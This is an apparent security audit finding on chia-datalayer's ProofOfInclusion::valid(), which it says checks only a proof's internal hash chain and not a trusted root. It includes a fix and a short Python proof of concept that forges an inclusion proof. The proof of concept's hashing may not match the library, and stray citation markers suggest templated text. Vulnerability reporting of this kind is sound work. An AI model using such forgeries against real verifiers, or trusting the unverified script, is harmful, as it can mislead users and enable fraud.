### Title
`ProofOfInclusion::valid()` Validates Only Internal Consistency, Not Against a Trusted Root — Forged DataLayer Inclusion Proofs Accepted - (File: crates/chia-datalayer/src/merkle/proof_of_inclusion.rs)

### Summary

`ProofOfInclusion::valid()` in the DataLayer crate checks only that the proof's own hash chain is internally self-consistent. It never compares the computed root against an external, trusted tree root. The "root" it validates against is derived from the proof's own `combined_hash` field — an attacker-controlled value. Any caller that relies on `proof.valid()` alone to verify that a key is included in a specific DataLayer tree can be fooled by a forged proof.

### Finding Description

`ProofOfInclusion` is a `Streamable` type (deserializable from bytes) exposed via Python bindings. Its `valid()` method is:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()   // ← tautological
}
``` [1](#0-0) 

The `root_hash()` method returns the last layer's `combined_hash` — a field that is part of the proof itself:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

After the loop, `existing_hash` equals the last `calculated_hash`, which was just verified to equal `layer.combined_hash`. Therefore `existing_hash == self.root_hash()` is **always true** after the loop completes — the final check is a tautology and provides zero security.

The function never accepts an external trusted root hash parameter. It only verifies that the proof's own hash chain is internally self-consistent. An attacker can construct a `ProofOfInclusion` with:
- An arbitrary `node_hash` (claiming any key is "included")
- Arbitrary `other_hash` values
- `combined_hash` values computed correctly from the above

Such a proof passes `valid()` while proving inclusion of a key that is not in the actual tree.

This is structurally identical to the external report's vulnerability: instead of using a canonical external value (the actual tree root), the validation uses a value from the untrusted input itself (the proof's `combined_hash`).

### Impact Explanation

Any DataLayer client that deserializes a `ProofOfInclusion` from an untrusted source and calls `proof.valid()` to verify key inclusion will accept forged proofs. An attacker can prove inclusion of any key-value pair in any tree root, without possessing the actual tree. This allows untrusted input to prove invalid state — matching the allowed High impact: "DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."

### Likelihood Explanation

Medium. The `ProofOfInclusion` type is `Streamable` and exposed via Python bindings with a `valid()` method whose name strongly implies complete proof validation. Callers that use `proof.valid()` without separately checking `proof.root_hash() == known_root` are vulnerable. The misleading API name makes this error easy to make. The fuzz target and test suite only call `proof.valid()` on proofs generated from a trusted `MerkleBlob`, so the flaw is not caught by existing tests. [5](#0-4) 

### Recommendation

`valid()` must accept an external trusted root hash and compare against it:

```rust
pub fn valid_against_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root   // compare against external trusted root
}
```

The current `valid()` (self-consistency only) should either be removed or clearly renamed to `is_internally_consistent()` to prevent misuse.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer, Side
import hashlib

# Forge a proof claiming key_hash is included in some tree
key_hash = bytes([0xAA] * 32)
other_hash = bytes([0xBB] * 32)

# Compute combined_hash as calculate_internal_hash would
# (sha256 of the pair, order determined by Side)
combined = hashlib.sha256(key_hash + other_hash).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=Side.Right,  # or Left
    other_hash=other_hash,
    combined_hash=combined,
)

forged_proof = ProofOfInclusion(node_hash=key_hash, layers=[layer])

# valid() returns True for a completely fabricated proof
assert forged_proof.valid()  # passes — forged proof accepted
# root_hash() returns the attacker-chosen combined_hash
assert forged_proof.root_hash() == combined
```

The forged proof passes `valid()` despite `key_hash` not being in any real tree. Any verifier that calls only `proof.valid()` is deceived.
